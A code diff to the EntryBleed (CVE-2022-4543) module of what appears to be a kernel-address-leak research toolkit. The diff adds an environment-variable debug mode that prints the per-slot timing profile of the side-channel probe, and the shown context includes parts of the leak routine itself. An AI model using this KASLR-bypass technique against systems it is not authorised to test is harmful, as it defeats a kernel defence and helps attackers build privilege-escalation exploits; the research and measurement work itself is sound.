@@ -59,6 +59,13 @@
 // https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html
 // https://bugs.chromium.org/p/project-zero/issues/detail?id=2351
 //
+// Debugging:
+//   -v / KASLD_VERBOSE        the CPU/KPTI posture and the recovered base.
+//   KASLD_ENTRYBLEED_DEBUG=1  the mean cycle count of every probed slot, for
+//                             each offset tried, with the minimum marked. The
+//                             winner alone cannot show whether it stood clear
+//                             of the noise or merely happened to be lowest.
+//
 // KASLD_BUILD_NO_OPTIMIZE: built -O0 (Makefile) so the optimizer cannot reorder
 // or elide the timing / cache-probe / speculation measurements this technique
 // relies on; a per-function no-opt attribute is not a reliable substitute.
@@ -182,6 +189,8 @@ static int detect_kernel_version(void) {
  * probe. */
 #define EB_VOTE_PASSES 7
 
+static int debug_mode; /* KASLD_ENTRYBLEED_DEBUG: the whole slot profile */
+
 static uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t data[ARR_SIZE] = {0};
   uint64_t min = ~0, addr = ~0;
@@ -207,6 +216,20 @@ static uint64_t leak_syscall_entry(uint64_t offset) {
     if (data[index] < min) {
       min = data[index];
       addr = SCAN_START + index * STEP;
+    }
+  }
+
+  /* The whole profile, not just the winner. The technique picks the cheapest
+   * slot, so a wrong answer looks identical to a right one from the winner
+   * alone -- what separates them is whether the minimum stands clear of the
+   * rest or sits inside the noise, which needs every slot to see. */
+  if (debug_mode) {
+    fprintf(stderr, "# entrybleed offset 0x%lx: mean cycles per slot\n",
+            (unsigned long)offset);
+    for (index = 0; index < ARR_SIZE; index++) {
+      unsigned long slot = (unsigned long)(SCAN_START + index * STEP);
+      fprintf(stderr, "#   0x%lx %lu%s\n", slot, (unsigned long)data[index],
+              slot == (unsigned long)addr ? "  <- min" : "");
     }
   }
 
@@ -293,6 +316,8 @@ static unsigned long get_kernel_addr_entrybleed(void) {
 int main(void) {
   if (kasld_skip_live_probe("entrybleed"))
     return 0;
+
+  debug_mode = getenv("KASLD_ENTRYBLEED_DEBUG") != NULL;
   kasld_info("trying EntryBleed (CVE-2022-4543) ...");
 
   unsigned long addr = get_kernel_addr_entrybleed();
